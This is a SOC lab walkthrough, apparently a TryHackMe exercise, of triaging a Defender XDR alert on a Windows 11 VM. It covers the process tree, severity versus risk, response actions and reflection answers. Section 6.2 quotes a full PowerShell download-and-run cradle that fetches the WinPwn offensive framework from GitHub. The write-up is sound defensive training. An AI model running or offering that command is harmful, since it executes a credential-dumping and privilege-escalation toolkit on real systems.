Lab Walkthrough — Incident Investigation

6.1 Alert Overview

FieldValueAlert nameA script with suspicious content was observedAlert severityShow ImageIncident risk levelShow ImageAffected devicevm-evil-xdr (Windows 11)User accountvm-evil-xdr\evil-xdrDetection sourceEDRMITRE techniqueT1059.001 (PowerShell) + 2 additional related techniquesTimestamp14 May 2026, 15:08:32Process ID5104 (powershell.exe)Integrity levelHigh

## Alert Overview

![Alert Overview](screenshots/the_alert.png)



6.2 Process Tree and Command Line

The initiating process was powershell_ise.exe (PID 11080), which spawned a child powershell.exe process (PID 5104) executing a remote download-and-run cradle:

```
powershellpowershell.exe & {iex(new-object net.webclient).downloadstring(
    'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...'
) -MS17-10 -noninteractive -consoleoutput}
```

## Alert Details

![alert details](screenshots/alert_details.png)



6.3 Technical Breakdown


Invoke-Expression (iex) takes the string it receives and executes it as a live command — the mechanism behind most fileless PowerShell attacks.
New-Object Net.WebClient).DownloadString(...) reaches out to an external URL, pulls the script down as plain text, and pipes it straight into iex — meaning the payload is never written to disk and standard file-based antivirus scanning never sees it.
The target repository (WinPwn) is a well-known, publicly available offensive security automation framework. It performs local system triage, Active Directory misconfiguration discovery, credential dumping, and privilege-escalation path identification — the kind of toolkit used legitimately in authorized penetration tests, but equally attractive to a genuine intruder.


6.4 Network & Infrastructure Context

FieldValueRemote session initiator IP10.5.0.2Remote session initiator deviceLAPTOP-FKQ39MRR

The process is flagged as a remote execution, meaning the operator was not physically at the console of vm-evil-xdr. They were connected from a separate internal host — most consistent with an RDP session or an administrative remote shell. This is a significant pivot point for the investigation: LAPTOP-FKQ39MRR is now a device of interest in its own right, not just the source of an alert.


📷 Screenshot placeholder: network / remote session context — screenshots/03-network-context.png



6.5 Severity vs. Risk — Why They Diverge

One of the more instructive parts of this lab is that the alert severity (Medium) and the incident risk level (High) don't match — and that's by design, not an error.


Alert severity answers "how bad is this specific technique in isolation?"
Risk level answers "how bad is this in the context of what it touches?" — asset criticality, account privilege, network segment, and any active remote sessions to other sensitive devices.


In this case, the underlying technique (a PowerShell download cradle) is a fairly common and well-understood pattern, hence Medium severity. But the session was running at High integrity, tied to an account with an active remote session to another device, which is why Defender XDR escalated the overall incident risk to High. This distinction directly drives SOC triage prioritization — a queue sorted purely by severity would have under-prioritized this incident.

6.6 Response and Containment Actions Considered

Once the alert is assessed as malicious, the following actions are available directly from the incident:


Run an antivirus scan on the affected device
Collect an investigation package for offline forensic review
Restrict further application execution on the host
Launch Microsoft Defender XDR Automated Investigation
Start a live response session for hands-on remote triage
Isolate the device to cut off lateral movement
Pivot into Advanced Hunting ("Go hunt") to search the wider environment for related indicators



📷 Screenshot placeholder: response action options — screenshots/04-response-actions.png




7. Knowledge Check — Room Questions

#QuestionAnswer1Which Defender for Office 365 control prevents execution of harmful scripts/malware embedded in attachments?Safe Attachments2Which Defender for Endpoint ASR rule blocks scripts from launching malicious downloaded content?Block JavaScript or VBScript from launching downloaded executable content3Setting Defender for Endpoint device discovery to "standard discovery" is a prerequisite for which capability?Automatic attack disruption


8. Defender XDR Controls Matrix — Execution Tactic

LayerDetectionPreventionMitigation / ResponseEndpointOnboard all devices to Defender for Endpoint; Advanced Hunting (Execution query templates)ASR rules (obfuscated scripts, email-based executable content, JS/VBScript launching downloads); Controlled Folder AccessAutomated Investigation & Response (AIR); Automatic Attack DisruptionIdentityDefender for Identity — anomalous behaviour detection tied to execution activity——Cloud AppsThreat detection policiesConditional Access App Control; Access and session policies—Email (Office 365)Zero-hour Auto Purge (ZAP)Anti-phishing policies; Safe Attachments; Safe Links—

Automatic Attack Disruption in particular requires the full Defender stack (Endpoint, Office 365, Identity, Cloud Apps) deployed, device groups set to Full remediation, and endpoint discovery set to standard discovery — with a Global or Security Administrator role required to review and approve AIR/disruption actions.


9. Reflection Questions


1. Why did the incident's risk level (High) diverge from the alert's severity (Medium), and what does that mean for how a SOC should build its triage queue?
Severity measures the technique in isolation; risk measures blast radius. A queue sorted on severity alone would have buried this incident behind noisier but lower-context alerts. It reinforced for me that triage has to weight context — account privilege, asset criticality, active remote sessions — not just the technical mechanics of the alert itself.




2. Why is a legitimate admin tool like PowerShell treated as a high-value detection surface rather than simply being blocked outright?
Blocking PowerShell wholesale isn't realistic in most enterprise environments — it's a core administrative tool. The defensive answer instead is visibility: script block logging, process auditing, and behavioural baselining so that abnormal usage patterns (encoded commands, download cradles, disabling security controls) stand out against normal admin activity. This is the LotL problem in a nutshell, and it's a big part of why EDR/XDR platforms lean on behavioural analytics instead of static signatures.




3. Given that WinPwn is also used legitimately in authorized penetration tests, what additional evidence would you want before concluding this was a genuine compromise rather than a sanctioned red-team exercise?
I'd want to correlate against a change-management or pentest-authorization record, confirm whether the account evil-xdr and the source device LAPTOP-FKQ39MRR are documented red-team assets, and check whether the security team had prior notification. Absent that confirmation, the remote-execution pattern and high-integrity session are enough to justify treating it as hostile until proven otherwise — which is the right default posture for a SOC analyst.




4. How does this lab map onto a real SOC/CSIRT workflow (detect → triage → contain → eradicate → recover)?
The lab covers detect (EDR alert), triage (process tree + severity/risk analysis), and the start of containment (isolate device, restrict execution). It stops short of eradication/recovery, but the natural next step — pivoting to the source device LAPTOP-FKQ39MRR — is exactly the kind of lead a CSIRT analyst would chase down before closing the incident.




10. Key Takeaways


Practiced end-to-end alert triage inside Microsoft Defender XDR, from initial alert to command-line-level analysis
Reinforced the distinction between alert severity and incident risk level in real triage decisions
Deepened understanding of fileless / LotL execution techniques and why they evade file-based AV
Mapped Defender XDR's detection, prevention, and automated-response capabilities across Endpoint, Identity, Cloud Apps, and Office 365
Practiced translating a technical finding (a PowerShell download cradle) into a business-risk narrative — a skill directly relevant to SOC reporting and CSIRT communication



References


TryHackMe, XDR: Execution
TryHackMe, Microsoft Defender XDR Module
TryHackMe, Defending Azure Path
MITRE ATT&CK®, Execution Tactic (TA0002)
Microsoft Learn, Microsoft Defender XDR documentation
